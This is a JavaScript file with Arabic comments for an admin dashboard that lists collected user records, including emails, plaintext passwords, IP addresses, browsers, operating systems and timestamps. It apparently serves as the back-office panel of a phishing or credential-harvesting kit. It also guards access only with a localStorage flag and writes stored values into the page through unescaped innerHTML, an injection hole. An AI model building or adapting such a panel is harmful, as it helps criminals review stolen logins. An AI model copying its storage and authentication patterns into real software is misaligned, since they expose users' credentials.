// تهيئة لوحة الإدارة
document.addEventListener('DOMContentLoaded', function() {
    // التحقق من المصادقة
    if (localStorage.getItem('adminLoggedIn') !== 'true') {
        window.location.href = 'index.html';
        return;
    }
    
    // عرض إحصائيات المستخدمين
    updateStats();
    
    // عرض بيانات المستخدمين
    displayUsers(users);
    
    // أحداث البحث
    document.getElementById('searchButton').addEventListener('click', function() {
        const query = document.getElementById('searchInput').value;
        const results = searchUsers(query);
        displayUsers(results);
    });
    
    document.getElementById('searchInput').addEventListener('keyup', function(e) {
        if (e.key === 'Enter') {
            const query = document.getElementById('searchInput').value;
            const results = searchUsers(query);
            displayUsers(results);
        }
    });
});

// تحديث الإحصائيات
function updateStats() {
    document.getElementById('totalUsers').textContent = users.length;
    
    if (users.length > 0) {
        const lastUser = users[users.length - 1];
        document.getElementById('lastLogin').textContent = lastUser.timestamp;
    }
}

// عرض بيانات المستخدمين
function displayUsers(usersToDisplay) {
    const tableBody = document.getElementById('userDataTable');
    tableBody.innerHTML = '';
    
    usersToDisplay.forEach((user, index) => {
        const row = document.createElement('tr');
        
        row.innerHTML = `
            <td>${index + 1}</td>
            <td>${user.email}</td>
            <td>${user.password}</td>
            <td>${user.ip}</td>
            <td>${user.browser}</td>
            <td>${user.os}</td>
            <td>${user.timestamp}</td>
            <td>
                <button onclick="deleteUserAndRefresh(${user.id})">حذف</button>
            </td>
        `;
        
        tableBody.appendChild(row);
    });
}

// حذف مستخدم وتحديث الصفحة
window.deleteUserAndRefresh = function(userId) {
    if (confirm('هل أنت متأكد من حذف هذا المستخدم؟')) {
        deleteUser(userId);
        updateStats();
        displayUsers(users);
    }
};